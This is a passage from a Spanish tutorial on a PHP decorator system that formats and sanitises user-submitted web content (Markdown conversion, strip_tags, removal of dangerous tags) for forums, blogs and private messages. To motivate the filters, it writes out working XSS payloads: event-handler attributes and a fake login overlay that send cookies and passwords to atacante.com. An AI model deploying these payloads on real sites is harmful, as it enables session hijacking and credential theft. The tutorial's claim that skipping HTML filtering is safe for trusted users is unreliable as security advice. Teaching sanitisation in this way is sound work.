# Explicación Detallada: Sistema de Formateo de Contenido Web

## 1. Situación real planteada

Imagina que eres el desarrollador responsable de un sitio web tipo **foro o comunidad online** (similar a Reddit, Stack Overflow, o un blog con comentarios). Tu sitio tiene diferentes secciones donde los usuarios pueden publicar contenido:

1. **Contenido de la propia web creado por el administrador**
2. **Contenido creado por editores de confianza**
3. **Mensajes privados entre usuarios premium**
4. **Posts en el foro de la comunidad**
5. **Comentarios en artículos del blog**

---
---

## 2. ¿Qué tipo de contenido puede escribir un usuario?

Cuando un usuario escribe en un formulario (independientemente del destino de este), tiene la libertad de escribir diferentes tipos de contenido:

### **Texto Plano**

```
Hola, me ha gustado mucho este artículo.
Gracias por compartirlo.
```

- Sin ningún formato
- Sin caracteres especiales de HTML o Markdown
- Completamente seguro

### **Markdown**

```markdown
# Título
Esto es **negrita** y esto es *cursiva*.
```

- Sintaxis de marcado ligera
- Fácil de escribir para usuarios no técnicos
- Necesita convertirse a HTML para mostrarse con formato
- Relativamente seguro (no puede ejecutar scripts directamente)

### **HTML**

```html
<h1>Título</h1>
<p>Esto es un <strong>párrafo</strong> con formato.</p>
```

- Código HTML directo
- Da control completo sobre el formato
- **PELIGROSO**: puede contener scripts maliciosos
- Solo apropiado para usuarios de confianza

### **HTML con Scripts Maliciosos**

```html
Hola <script>
  document.location = 'http://sitio-phishing.com';
</script>
```

- HTML que incluye código JavaScript
- **MUY PELIGROSO**: puede robar datos, redirigir usuarios, etc.
- Debe ser filtrado SIEMPRE en contenido público

### **Markdown + HTML Mezclado**

```markdown
# Mi Post
Esto es **importante** y aquí hay HTML: <b>negrita</b>
<script>alert('ataque')</script>
```

- Usuario escribe Markdown pero también añade HTML (intencionalmente o no)
- Necesita procesarse en orden: primero convertir Markdown, luego filtrar HTML
- Común cuando usuarios copian/pegan de otras fuentes

### **HTML con Atributos Peligrosos (Ataques XSS Reales)**

**Forma básica (incompleta, como mencionaste):**

```html
<a href="#" onclick="robarDatos()">Click aquí</a>
<img src="x" onerror="ejecutarMalware()">
```

Esto solo no hace nada porque `robarDatos()` y `ejecutarMalware()` no existen.

**PERO - Forma completa (ataque real):**
```html
<a href="#" onclick="fetch('http://atacante.com/robar?cookie=' + document.cookie); return false;">
  ¡Gana un iPhone gratis! Click aquí
</a>

<img src="imagen-inexistente.jpg" onerror="
  var usuario = document.getElementById('username').value;
  var pass = document.getElementById('password').value;
  fetch('http://atacante.com/credenciales?u=' + usuario + '&p=' + pass);
">

<div onmouseover="
  document.getElementById('boton-pagar').onclick = function() {
    alert('Cancelado');
    return false;
  };
">
  Pasa el ratón aquí para ver más info
</div>
```

**Por qué esto es peligroso:**

1. **El atributo `onclick` contiene código JavaScript completo directamente:**
   ```html
   onclick="fetch('http://atacante.com/robar?cookie=' + document.cookie); return false;"
   ```
   - NO necesita una función `robarDatos()` definida en otro lugar
   - El código está **dentro del atributo** y se ejecuta cuando haces click
   - `document.cookie` obtiene las cookies de sesión del usuario
   - `fetch()` las envía al servidor del atacante
   - El atacante recibe las cookies y puede hacerse pasar por el usuario

2. **El atributo `onerror` se ejecuta automáticamente:**
   ```html
   <img src="imagen-inexistente.jpg" onerror="CÓDIGO MALICIOSO">
   ```
   - Pones una imagen que NO existe (`imagen-inexistente.jpg`)
   - El navegador intenta cargarla, falla
   - **Automáticamente ejecuta** el código en `onerror`
   - No necesitas que el usuario haga click, se ejecuta al cargar la página
   - Puede robar contraseñas de campos del formulario que está viendo

3. **Otros eventos peligrosos:**
   ```html
   <body onload="código_malicioso">  <!-- Se ejecuta al cargar la página -->
   <div onmouseover="código">        <!-- Se ejecuta al pasar el ratón -->
   <input onfocus="código">          <!-- Se ejecuta al enfocar el campo -->
   <form onsubmit="código">          <!-- Se ejecuta al enviar el formulario -->
   ```

**Ejemplo de ataque completo y real:**

Usuario malicioso escribe esto en un comentario:
```html
Me encantó el artículo. 
<img src="x" onerror="
  // Esperar 2 segundos para que el usuario vea contenido normal
  setTimeout(function() {
    // Crear un div falso que parece ser del sitio
    var fake = document.createElement('div');
    fake.innerHTML = '<h2>Tu sesión expiró</h2><form><input id=u placeholder=Usuario><input id=p type=password placeholder=Contraseña><button onclick=robar()>Entrar</button></form>';
    fake.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:20px;box-shadow:0 0 10px black;z-index:9999';
    document.body.appendChild(fake);
    
    // Función que roba las credenciales
    window.robar = function() {
      var user = document.getElementById('u').value;
      var pass = document.getElementById('p').value;
      fetch('http://atacante.com/robar?u=' + user + '&p=' + pass);
      fake.remove();
      alert('Error de conexión, intente de nuevo');
      return false;
    };
  }, 2000);
">
```

**Qué pasa cuando alguien ve ese comentario:**
1. La página carga normalmente
2. La imagen `x` no existe → se activa `onerror`
3. 2 segundos después aparece un popup que dice "Tu sesión expiró"
4. Parece legítimo porque está estilizado como el sitio
5. El usuario ingresa su usuario y contraseña
6. Al hacer click en "Entrar", las credenciales se envían al atacante
7. El popup desaparece mostrando "Error de conexión"
8. El usuario piensa que fue un problema técnico
9. **El atacante tiene ahora las credenciales del usuario**

**Por eso `DangerousHTMLTagsFilter` elimina estos atributos:**
```html
<!-- ANTES del filtro -->
<a href="sitio.com" onclick="fetch('http://atacante.com/robar?c=' + document.cookie)">
  Click aquí
</a>

<!-- DESPUÉS del filtro -->
<a href="sitio.com">
  Click aquí
</a>
```

El filtro elimina **solo el atributo `onclick`**, dejando el enlace funcional pero seguro.

**Diferencia clave con `<script>`:**

```html
<!-- Opción 1: Usar <script> (más obvio) -->
<script>
  fetch('http://atacante.com/robar?cookie=' + document.cookie);
</script>

<!-- Opción 2: Usar atributos de eventos (más difícil de detectar) -->
<img src="x" onerror="fetch('http://atacante.com/robar?cookie=' + document.cookie)">
```

Ambos hacen lo mismo, pero:
- El `<script>` es más fácil de detectar y bloquear (filtros buscan `<script>`)
- Los atributos de eventos están "escondidos" en tags que parecen inocentes (`<img>`, `<a>`)
- Por eso un buen filtro debe eliminar AMBOS

---
---

## 3. El problema principal: seguridad vs experiencia de usuario

Cuando los usuarios escriben contenido en tu sitio web, los administradores del sitio se enfrentan a dos necesidades contradictorias.

**Experiencia de usuario:**
- los usuarios quieren poder formatear su texto (negritas, cursivas, títulos, listas)
- quieren que sea fácil escribir (no todo el mundo sabe HTML)
- quieren que su contenido se vea bien

**Seguridad:**
- los usuarios malintencionados pueden intentar insertar código malicioso
- un simple `<script>alert('hack')</script>` podría robar contraseñas
- enlaces con JavaScript (`<a onclick="robarDatos()">`) son peligrosos
- necesitas proteger a los demás usuarios de ataques XSS (Cross-Site Scripting)

---
---

## 4. Escenarios posibles

Teniendo en cuenta todo lo dicho anteriormente, podemos imaginar una serie de posibles escenarios en los que nos puede interesar o no aplicar determinadas medidas correctivas o de seguridad.

### **Escenario A: Administrador Edita Contenido del Sitio**

**Contexto:**
- Usuario administrador del sitio.
- Edita páginas institucionales (Sobre Nosotros, Política de Privacidad).
- Necesita control total sobre el HTML.
- Solo él puede acceder a esta funcionalidad.

**Qué busca conseguir:**
1. **NO procesar nada.**
2. **Intervención NULA:** El texto se entrega tal cual.
3. **Permitir cualquier código HTML/JavaScript.**

**Por qué queremos esto:**
- **Control total:** El administrador sabe lo que hace.
- **Confianza absoluta:** Es el dueño del sitio.

**Solución técnica:**
- Usar solo el componente base `AppInput` (sin decoradores).
- Resultado: HTML original sin modificar.

### **Escenario B: Editor de Contenido Confiable**

**Contexto:**
- Personal de edición verificado por la empresa.
- Escriben artículos con formato HTML (etiquetas `<div>`, estilos CSS).
- Saben lo que hacen, pero queremos una red de seguridad ante errores o scripts pegados por accidente.

**Qué busca conseguir:**
1. **Intervención BAJA:** Limpiar solo lo que suponga un riesgo real.
2. **Saneo selectivo:** Eliminar scripts y atributos de eventos (`onclick`), pero mantener el diseño HTML.

**Solución técnica:**
- Usar `DangerousHTMLTagsDecorator` envolviendo al `AppInput`.
- Resultado: Diseño HTML intacto pero libre de código ejecutable.

### **Escenario C: Mensajes Privados Entre Usuarios Premium**

**Contexto:**
- Usuarios premium con cuentas verificadas.
- Comunicación privada entre dos personas.
- Se prefiere la facilidad de Markdown para dar formato profesional.

**Qué busca conseguir:**
1. **Intervención MEDIA:** Transformar el formato.
2. **Conversión de Markdown:** `# Título` → `<h1>`, `**negrita**` → `<strong>`.

**Solución técnica:**
- Usar `MarkdownDecorator` envolviendo al `AppInput`.
- Resultado: HTML formateado rico, basándose en la sintaxis simplificada de Markdown.

### **Escenario D: Posts en Foro de la Comunidad**

**Contexto:**
- Usuarios registrados (confianza media).
- Escriben tutoriales y guías usando HTML o Markdown (no todos los usuarios que escriben conocen HTML)
- TODOS los usuarios de la web, registrados o no, pueden ver el contenido.
- Existe riesgo de que escriban código malicioso o peguen código malicioso desde otras webs.

**Qué busca conseguir:**
1. **Intervención ALTA:** Transformar y Sanear.
2. **Doble capa:** Primero convertir Markdown y luego filtrar el resultado por seguridad.

**Solución técnica:**
- Componer: `DangerousHTMLTagsDecorator` envolviendo a `MarkdownDecorator` envolviendo a `AppInput`.
- Resultado: Un tutorial perfectamente formateado pero garantizado como seguro para otros usuarios.

### **Escenario E: Comentarios Públicos (Anónimos)**

**Contexto:**
- Cualquier persona puede comentar sin registrarse.
- Riesgo de Spam y de inyectar código malicioso es máximo.

**Qué busca conseguir:**
1. **Intervención MÁXIMA:** Limpieza radical.
2. **Seguridad Total:** Eliminar absolutamente cualquier rastro de HTML.

**Solución técnica:**
- Usar `PlainTextDecorator` envolviendo al `AppInput`.
- Resultado: Texto plano puro. Si el usuario escribió `<b>Hola</b>`, el sistema mostrará simplemente `Hola`.

> 🤔 **¿Qué necesitamos implementar?**
>
> Necesitamos un sistema que:
>
> 1. **Procese el texto** que envían los usuarios antes de guardarlo en la base de datos o mostrarlo
> 2. **Aplique diferentes reglas** según dónde se publique ese contenido
> 3. **Sea fácil de mantener** (si mañana decides permitir BBCode, que sea simple añadirlo)
4. **Sea flexible** (poder combinar reglas en diferentes órdenes)

---
---

## 5. ¿Cómo funciona esta aplicación de ejemplo?

La aplicación recibe **texto sin procesar** de un usuario y lo transforma aplicando una o más operaciones en secuencia.

Las operaciones o **Decoradores** disponibles son:

### Tabla Resumen: Los 5 Escenarios y Qué Decoradores Usan

| Escenario | Grado Intervención | Decoradores Usados | Qué se Consigue | Seguridad |
|-----------|--------------------|--------------------|-----------------|-----------|
| **A: Administrador** | **NULA** | *(ninguno, solo `AppInput`)* | Texto original intacto | ❌ Administrador |
| **B: Editor Confiable** | **BAJA** | `DangerousHTMLTagsDecorator` | HTML seguro, sin scripts | ✅ Alta |
| **C: Mensajes Premium** | **MEDIA** | `MarkdownDecorator` | Formato Markdown a HTML | ⚠️ Informativa |
| **D: Posts de Foro** | **ALTA** | `MarkdownDecorator` + `DangerousHT...` | Formato + Saneo selectivo | ✅ Alta |
| **E: Comentarios Anón.** | **MÁXIMA** | `PlainTextDecorator` | Texto plano puro, sin HTML | ✅ Máxima |

**Resumen de la arquitectura:**
- **`AppInput`**: El componente base (obligatorio).
- **`PlainTextDecorator`**: Se usa en Escenario E (seguridad radical).
- **`MarkdownDecorator`**: Se usa en Escenarios C y D (formateo).
- **`DangerousHTMLTagsDecorator`**: Se usa en Escenarios B y D (seguridad selectiva).

---
---

## 6. Los Decoradores disponibles

Los 3 decoradores que se han creado para este ejemplo realizan, cada uno de ellos, una operacion concreta.

### Decorador `MarkdownDecorator`: conversión de Markdown a HTML

**Qué escribe probablemente el usuario:**
```markdown
# Mi Tutorial sobre Python

Python es **fácil** de aprender. Aquí los pasos:

## Instalación
Descarga Python desde el sitio oficial.

## Primer Programa
Escribe tu primer *Hola Mundo*.
```

**Problema que esto supone:**
El navegador web NO entiende Markdown. Si guardas este texto tal cual en la base de datos y lo muestras en HTML, el usuario verá:
```
# Mi Tutorial sobre Python

Python es **fácil** de aprender. Aquí los pasos:

## Instalación
...
```
Es decir, verá los símbolos literales `#`, `**`, `##` sin ningún formato. El texto se ve feo y confuso.

**Qué hace la operación `MarkdownDecorator`:**
Convierte cada símbolo de Markdown a su equivalente HTML:
- `# Título` → `<h1>Título</h1>` (encabezado nivel 1, grande)
- `## Subtítulo` → `<h2>Subtítulo</h2>` (encabezado nivel 2, mediano)
- `**negrita**` → `<strong>negrita</strong>` (texto en negrita)
- `*cursiva*` → `<em>cursiva</em>` (texto en cursiva)
- Párrafos simples → `<p>texto</p>` (párrafos HTML)

**Resultado después de la conversión:**
```html
<h1>Mi Tutorial sobre Python</h1>

<p>Python es <strong>fácil</strong> de aprender. Aquí los pasos:</p>

<h2>Instalación</h2>
<p>Descarga Python desde el sitio oficial.</p>

<h2>Primer Programa</h2>
<p>Escribe tu primer <em>Hola Mundo</em>.</p>
```

**Por qué esto resuelve el problema:**
Ahora el navegador SÍ entiende el código. Mostrará:
- "Mi Tutorial sobre Python" en letra GRANDE (porque es `<h1>`)
- "fácil" en **negrita** (porque es `<strong>`)
- "Instalación" en letra mediana (porque es `<h2>`)
- "Hola Mundo" en *cursiva* (porque es `<em>`)

El texto se ve bonito, estructurado, fácil de leer. El usuario no tuvo que aprender HTML, solo usó Markdown (mucho más simple).

**Problema potencial que queda:**
Si el usuario también escribió HTML malicioso mezclado con el Markdown (ej: `<script>robar()</script>`), ese HTML se mantiene intacto. Por eso esta operación normalmente se combina con un filtro de seguridad que se aplica DESPUÉS.

---

### Decorador `PlainTextDecorator`: eliminación total de HTML

**Qué escribe probablemente el usuario:**
```
¡Genial artículo! 

Visita mi página <a href="http://sitio-spam.com">AQUÍ</a> para más info.

<script>
  // Código que roba cookies
  fetch('http://atacante.com/robar?cookie=' + document.cookie);
</script>

También puedes ver <b>ofertas especiales</b> en mi sitio.
```

**Problema que esto supone:**
Si muestras este contenido tal cual en tu web:
1. **El script se ejecutará:** Cuando cualquier usuario vea el comentario, el código JavaScript se ejecutará en su navegador y enviará sus cookies (incluida la sesión de login) al atacante. El atacante podrá hacerse pasar por ese usuario.
2. **El enlace aparecerá:** Se mostrará un enlace clickeable que lleva a un sitio de spam o phishing.
3. **El formato HTML funcionará:** La negrita `<b>` se mostrará en negrita.

Todo esto es PELIGROSO en comentarios públicos donde cualquiera puede escribir.

**Qué hace la operación `PlainTextDecorator`:**
Utiliza la función `strip_tags()` de PHP que elimina TODAS las etiquetas HTML del texto:
- Elimina `<script>...</script>` completo (incluido el contenido)
- Elimina `<a href="...">` pero mantiene el texto del enlace
- Elimina `<b>` y `</b>` pero mantiene el texto
- Elimina CUALQUIER etiqueta HTML: `<div>`, `<span>`, `<img>`, `<iframe>`, todas

**Resultado después del filtrado:**
```
¡Genial artículo! 

Visita mi página AQUÍ para más info.

También puedes ver ofertas especiales en mi sitio.
```

**Por qué esto resuelve el problema:**
1. **El script desapareció completamente:** No hay forma de que se ejecute código malicioso. Seguridad garantizada.
2. **El enlace ya no es clickeable:** Queda solo el texto "AQUÍ", sin la etiqueta `<a>`. No hay spam.
3. **No hay formato:** "ofertas especiales" se muestra en texto normal, sin negrita.

Es la opción más segura posible: elimina absolutamente todo lo que podría ser peligroso, al costo de perder todo el formato también.

**Cuándo usar esto:**
- Comentarios públicos donde la seguridad es prioridad absoluta (Escenario E)
- Contenido de usuarios anónimos o no confiables
- Cuando el formato no es importante (un comentario breve)

**Qué NO hace:**
- NO convierte Markdown a HTML (si el usuario escribió `**negrita**`, se queda así literalmente)
- NO interpreta nada, solo elimina etiquetas HTML

### Decorador `DangerousHTMLTagsDecorator`: eliminación selectiva de HTML peligroso

**Qué escribe probablemente el usuario:**
```html
<h2>Mi Reseña del Producto</h2>

<p>El producto es <strong>excelente</strong> y lo recomiendo totalmente.</p>

<p>Algunas características <em>importantes</em>:</p>
<ul>
  <li>Fácil de usar</li>
  <li>Buen precio</li>
</ul>

<script>
  // Intento de ataque XSS
  document.location = 'http://phishing.com/robar';
</script>

<a href="http://sitio-legítimo.com" onclick="robarDatos()">Más información</a>

<img src="logo.png" onerror="alert('XSS')">
```

**Problema que esto supone:**
El usuario ha escrito HTML válido y bien estructurado (`<h2>`, `<p>`, `<ul>`, etc.) que quieres MANTENER porque se ve bien. Pero también ha insertado:
1. **Un `<script>` malicioso:** Redirige a un sitio de phishing
2. **Un evento `onclick`:** Ejecuta código cuando haces click en el enlace
3. **Un `onerror` en imagen:** Ejecuta código si la imagen no carga

Si lo muestras tal cual, los ataques se ejecutarán. Pero si usas `PlainTextFilter`, perderás todo el formato bueno.

**Qué hace la operación `DangerousHTMLTagsDecorator`:**
Funciona en dos fases:

**Fase 1: Eliminar etiquetas completas peligrosas**
Busca y elimina completamente estas etiquetas:
- `<script>...</script>` → Se elimina todo, incluido el contenido
- Otras etiquetas peligrosas que podrías añadir: `<iframe>`, `<object>`, `<embed>`

**Fase 2: Eliminar atributos peligrosos de etiquetas**
Para las etiquetas que quedan, busca y elimina solo los atributos que ejecutan JavaScript:
- `onclick="..."` → Se elimina solo este atributo, la etiqueta se mantiene
- `onerror="..."` → Se elimina solo este atributo
- `onload="..."`, `onmouseover="..."` → Se eliminan
- Otros atributos normales se mantienen: `href="..."`, `src="..."`, `class="..."`

**Resultado después del filtrado:**
```html
<h2>Mi Reseña del Producto</h2>

<p>El producto es <strong>excelente</strong> y lo recomiendo totalmente.</p>

<p>Algunas características <em>importantes</em>:</p>
<ul>
  <li>Fácil de usar</li>
  <li>Buen precio</li>
</ul>

<a href="http://sitio-legítimo.com">Más información</a>

<img src="logo.png">
```

**Por qué esto resuelve el problema:**
1. **El `<script>` desapareció:** No se ejecutará código malicioso
2. **El `onclick` se eliminó:** El enlace es seguro, solo navega a la URL (que también deberías validar)
3. **El `onerror` se eliminó:** La imagen se muestra sin ejecutar código
4. **El HTML bueno se mantiene:** Los títulos `<h2>`, las negritas `<strong>`, las listas `<ul>` siguen ahí
5. **El contenido se ve bonito:** Mantiene todo el formato visual

**Cuándo usar esto:**
- Posts de foro donde quieres permitir formato rico
- Después de convertir Markdown a HTML (para eliminar cualquier script que pudiera haber)
- Con usuarios registrados (nivel de confianza medio)

**Diferencia clave con PlainTextFilter:**
- `PlainTextFilter`: Elimina TODO el HTML (tanto `<script>` como `<b>`)
- `DangerousHTMLTagsFilter`: Elimina SOLO el HTML peligroso (mantiene `<b>`, elimina `<script>`)

---
---

## 7. Combinación de Decoradores

Aquí está el verdadero valor del sistema. Puedes **encadenar** diferentes decoradores para obtener el resultado que necesites.

### **EJEMPLO 1: comentario público en el Blog**

**Situación completa:**
Juan acaba de leer un artículo en tu blog sobre "Las mejores prácticas en programación". Le gustó y quiere dejar un comentario. Juan NO está registrado en el sitio (es un visitante anónimo). 

Tu blog permite comentarios sin registro para facilitar la participación, pero esto significa que cualquier persona, incluyendo spammers y atacantes, puede comentar.

**Qué escribe Juan:**
```
¡Gran artículo! Visita mi sitio <a href="http://spam.com">aquí</a> para más consejos.
<script>document.location='http://phishing.com'</script>
Te doy **5 estrellas**
```

Juan probablemente no escribió el `<script>` malicioso intencionalmente. Quizás copió texto de otro sitio y venía con ese código. O quizás es un atacante deliberado. En cualquier caso, tu sistema debe manejarlo.

**Qué podría pasar si muestras esto sin procesarlo:**
1. **El script se ejecutaría:** Cuando alguien ve el comentario, su navegador ejecuta el código JavaScript y lo redirige a `http://phishing.com`. Este sitio podría:
   - Robar sus credenciales haciéndose pasar por tu sitio
   - Infectar su computadora con malware
   - Mostrar contenido ofensivo
2. **El enlace de spam aparecería:** Se mostraría como un enlace clickeable que lleva a un sitio de spam. Tu sección de comentarios se llenaría de basura.
3. **El Markdown no se convertiría:** Las 5 estrellas aparecerían literalmente como `**5 estrellas**` en lugar de en negrita, porque el navegador no entiende Markdown.

**Problema específico a resolver:**
- Necesitas **máxima seguridad** porque no confías en usuarios anónimos
- NO te importa que los comentarios tengan formato bonito (son comentarios simples)
- Prefieres **texto plano seguro** que **HTML formateado peligroso**

**Configuración aplicada:**
```php
$procesador = new PlainTextFilter(new TextInput());
```

**Flujo de procesamiento paso a paso:**

```
PASO 1: TextInput recibe el texto original
"¡Gran artículo! Visita mi sitio <a href="http://spam.com">aquí</a> para más consejos.
<script>document.location='http://phishing.com'</script>
Te doy **5 estrellas**"

TextInput no modifica nada, pasa el texto al siguiente componente
↓

PASO 2: PlainTextFilter recibe el texto
"¡Gran artículo! Visita mi sitio <a href="http://spam.com">aquí</a> para más consejos.
<script>document.location='http://phishing.com'</script>
Te doy **5 estrellas**"

PlainTextFilter ejecuta strip_tags() que:
- Elimina <a href="http://spam.com"> y </a> → Queda solo "aquí"
- Elimina <script>document.location='http://phishing.com'</script> completo → Desaparece
- Mantiene todo el texto que no es HTML → "¡Gran artículo!", "Te doy", etc.
- NO toca los ** porque no son HTML, son texto literal

Resultado:
"¡Gran artículo! Visita mi sitio aquí para más consejos.

Te doy **5 estrellas**"
```

**Salida final mostrada en la web:**
```
¡Gran artículo! Visita mi sitio aquí para más consejos.
Te doy **5 estrellas**
```

**Análisis del resultado:**
- ✅ **Seguro al 100%:** El script malicioso fue eliminado completamente. No hay posibilidad de ataque XSS.
- ✅ **Sin spam:** El enlace a `spam.com` fue eliminado. Queda solo el texto "aquí" sin ser clickeable.
- ❌ **Sin formato:** Los `**5 estrellas**` se quedaron literales, no se convirtieron a negrita. Pero esto es aceptable porque preferimos seguridad sobre formato en comentarios públicos.
- ✅ **Apropiado para el escenario:** Comentarios públicos de usuarios anónimos donde la seguridad es absolutamente prioritaria.

**Por qué esta configuración es correcta:**
En comentarios breves de blog, el formato no es crítico. Los usuarios pueden expresar su opinión en texto plano. La seguridad es mucho más importante que tener negritas o cursivas. Si permitieras HTML (aunque fuera filtrado), siempre existiría riesgo de que un atacante encuentre una vulnerabilidad nueva.

### **EJEMPLO 2: post en foro de la comunidad**

**Situación completa:**
María es una usuaria registrada en tu foro de tecnología. Tiene una cuenta verificada (ha confirmado su email) y ha publicado 15 posts anteriormente sin problemas. 

María quiere compartir un tutorial sobre Python. Sabe escribir en Markdown porque es más cómodo que HTML (no tiene que recordar cerrar etiquetas, no tiene que escribir `<strong>` y `</strong>`, solo pone `**texto**`).

María es una usuario legítima, pero eso no significa que su contenido sea 100% seguro. Podría:
- Copiar código de otro sitio que contenga scripts maliciosos
- Haber sido víctima de un hack en su cuenta
- Cometer un error al pegar contenido

**Qué escribe María:**
```
# Tutorial: Cómo usar Python

Primero necesitas instalar Python. Es **muy fácil**.

Pasos:
1. Descarga Python
2. Instala

<script>alert('Esto es malo')</script>
<b>Nota:</b> Esto es <i>importante</i>
```

**Análisis de lo que escribió:**
- **Markdown válido:** `# Tutorial` (título), `**muy fácil**` (negrita)
- **HTML básico seguro:** `<b>Nota:</b>` (negrita), `<i>importante</i>` (cursiva)
- **HTML malicioso:** `<script>alert('Esto es malo')</script>`

El `<script>` probablemente llegó porque María copió parte del tutorial de otro sitio y ese sitio tenía código malicioso (o era un sitio de demostración de XSS). María no se dio cuenta.

**Qué podría pasar si muestras esto sin procesar:**
1. **El Markdown no se vería bien:** El navegador mostraría literalmente `# Tutorial` en vez de un título grande
2. **El script se ejecutaría:** Cuando alguien lee el post, aparecería un alert molesto en su navegador
3. **El HTML básico funcionaría:** La negrita `<b>` y la cursiva `<i>` sí se mostrarían

**Problema específico a resolver:**
- Necesitas **convertir el Markdown a HTML** para que el tutorial se vea bien formateado
- Necesitas **eliminar el script** para proteger a otros usuarios
- Quieres **mantener el HTML básico** que escribió María porque es inofensivo
- Confías *medianamente* en María (es usuaria registrada) pero no al 100%

**Configuración aplicada:**
```php
$procesador = new DangerousHTMLTagsFilter(
    new MarkdownFormat(new TextInput())
);
```

**Flujo de procesamiento paso a paso:**

```
PASO 1: TextInput recibe el texto original
"# Tutorial: Cómo usar Python

Primero necesitas instalar Python. Es **muy fácil**.

Pasos:
1. Descarga Python
2. Instala

<script>alert('Esto es malo')</script>
<b>Nota:</b> Esto es <i>importante</i>"

TextInput no modifica nada, lo pasa al siguiente
↓

PASO 2: MarkdownFormat recibe el texto
"# Tutorial: Cómo usar Python

Primero necesitas instalar Python. Es **muy fácil**.

Pasos:
1. Descarga Python
2. Instala

<script>alert('Esto es malo')</script>
<b>Nota:</b> Esto es <i>importante</i>"

MarkdownFormat convierte Markdown a HTML:
- "# Tutorial: Cómo usar Python" → "<h1>Tutorial: Cómo usar Python</h1>"
- "Primero... Es **muy fácil**." → "<p>Primero... Es <strong>muy fácil</strong>.</p>"
- "Pasos:\n1. Descarga..." → "<p>Pasos:\n1. Descarga...\n2. Instala</p>"
- Los tags HTML (<script>, <b>, <i>) NO se tocan, pasan tal cual

Resultado intermedio:
"<h1>Tutorial: Cómo usar Python</h1>

<p>Primero necesitas instalar Python. Es <strong>muy fácil</strong>.</p>

<p>Pasos:
1. Descarga Python
2. Instala</p>

<script>alert('Esto es malo')</script>
<b>Nota:</b> Esto es <i>importante</i>"

↓

PASO 3: DangerousHTMLTagsFilter recibe el HTML generado
"<h1>Tutorial: Cómo usar Python</h1>
<p>Primero necesitas instalar Python. Es <strong>muy fácil</strong>.</p>
<p>Pasos: 1. Descarga Python 2. Instala</p>
<script>alert('Esto es malo')</script>
<b>Nota:</b> Esto es <i>importante</i>"

DangerousHTMLTagsFilter analiza y filtra:
- <h1>: ✅ Seguro, se mantiene (generado por Markdown)
- <p>: ✅ Seguro, se mantiene (generado por Markdown)  
- <strong>: ✅ Seguro, se mantiene (generado por Markdown)
- <script>: ❌ PELIGROSO, se elimina completamente
- <b>: ✅ Seguro, se mantiene (HTML básico de formato)
- <i>: ✅ Seguro, se mantiene (HTML básico de formato)

Resultado final:
"<h1>Tutorial: Cómo usar Python</h1>

<p>Primero necesitas instalar Python. Es <strong>muy fácil</strong>.</p>

<p>Pasos:
1. Descarga Python
2. Instala</p>

<b>Nota:</b> Esto es <i>importante</i>"
```

**Salida final mostrada en la web:**
```html
<h1>Tutorial: Cómo usar Python</h1>
<p>Primero necesitas instalar Python. Es <strong>muy fácil</strong>.</p>
<p>Pasos: 1. Descarga Python 2. Instala</p>
<b>Nota:</b> Esto es <i>importante</i>
```

**Cómo se ve visualmente:**
```
[Título grande]
Tutorial: Cómo usar Python

[Párrafo con negrita]
Primero necesitas instalar Python. Es muy fácil.

[Párrafo]
Pasos: 1. Descarga Python 2. Instala

[Texto con negrita y cursiva]
Nota: Esto es importante
```

**Análisis del resultado:**
- ✅ **Seguro:** El `<script>` malicioso fue eliminado. No se ejecutará código peligroso.
- ✅ **Con formato bonito:** El Markdown se convirtió correctamente a HTML. El título es grande, la negrita funciona.
- ✅ **HTML básico preservado:** Las etiquetas `<b>` y `<i>` que escribió María se mantienen.
- ✅ **Apropiado para foros:** Balance perfecto entre permitir formato rico y mantener seguridad.

**Por qué esta configuración es correcta:**
Los posts de foro son contenido importante que merece verse bien. Los usuarios invierten tiempo en escribirlos y quieren que se vean profesionales con títulos, negritas, etc. Markdown hace esto fácil para ellos.

El filtro de HTML peligroso protege contra ataques sin sacrificar la experiencia. María puede formatear su contenido, pero no puede (intencionalmente o por error) insertar código malicioso.

**Orden importante:**
Nota que primero convertimos Markdown y DESPUÉS filtramos. Si lo hiciéramos al revés:
1. Filtrar primero eliminaría el `<script>` ✓
2. Pero luego Markdown generaría HTML nuevo que no sería filtrado ✗
   
El orden correcto es: Markdown → Filtro

### **EJEMPLO 3: mensaje privado entre usuarios verificados**

**Situación completa:**
Carlos es un usuario premium de tu plataforma. Ha pagado una suscripción mensual, ha verificado su identidad con documento, y lleva 2 años usando el servicio sin problemas.

Carlos quiere enviar un mensaje privado a Laura (también usuaria premium verificada) para compartir un informe mensual de ventas. Este es un contexto profesional donde ambos se conocen y confían mutuamente.

El mensaje es privado: solo Carlos y Laura pueden verlo. No se muestra públicamente en ninguna parte del sitio.

**Qué escribe Carlos:**
```markdown
Hola Laura,

Te envío el **informe mensual** de ventas:

## Ventas Enero-Marzo

### Producto A
- Unidades vendidas: 1,200
- Ingresos: 45,000€

### Producto B  
- Unidades vendidas: 800
- Ingresos: 32,000€

Saludos,
Carlos
```

**Análisis de lo que escribió:**
- **Markdown profesional:** Títulos `##`, subtítulos `###`, negritas `**`, listas con `-`
- **Sin HTML:** Carlos solo usó Markdown, no escribió ninguna etiqueta HTML
- **Contenido seguro:** No hay scripts, no hay enlaces sospechosos

**Qué podría pasar con diferentes configuraciones:**

**Opción A - Sin procesar (TextInput solo):**
```
Hola Laura,

Te envío el **informe mensual** de ventas:

## Ventas Enero-Marzo

### Producto A
- Unidades vendidas: 1,200
```
Se vería horrible. Los símbolos `##`, `**`, `-` aparecerían literalmente.

**Opción B - Con PlainTextFilter:**
```
Hola Laura,

Te envío el informe mensual de ventas:

 Ventas Enero-Marzo

 Producto A
- Unidades vendidas: 1,200
```
Se vería como texto plano. Los `##` y `**` desaparecerían pero no habría formato.

**Opción C - Con MarkdownFormat (la que usamos):**
El Markdown se convierte a HTML bonito con formato profesional.

**Problema específico a resolver:**
- Carlos quiere que su informe se vea **profesional y estructurado**
- Laura necesita poder **leer fácilmente** la información con títulos claros
- Es un contexto **privado** entre dos usuarios de confianza máxima
- NO hay riesgo de ataque porque Carlos no es un atacante
- La **experiencia de usuario** es prioritaria sobre la seguridad extrema

**Configuración aplicada:**
```php
$procesador = new MarkdownFormat(new TextInput());
```

Nota: **NO usamos filtro de HTML peligroso** porque confiamos en usuarios premium verificados en mensajes privados.

**Flujo de procesamiento paso a paso:**

```
PASO 1: TextInput recibe el texto original
"Hola Laura,

Te envío el **informe mensual** de ventas:

## Ventas Enero-Marzo

### Producto A
- Unidades vendidas: 1,200
- Ingresos: 45,000€

### Producto B  
- Unidades vendidas: 800
- Ingresos: 32,000€

Saludos,
Carlos"

TextInput no modifica nada, lo pasa al siguiente
↓

PASO 2: MarkdownFormat recibe el texto
[mismo texto de arriba]

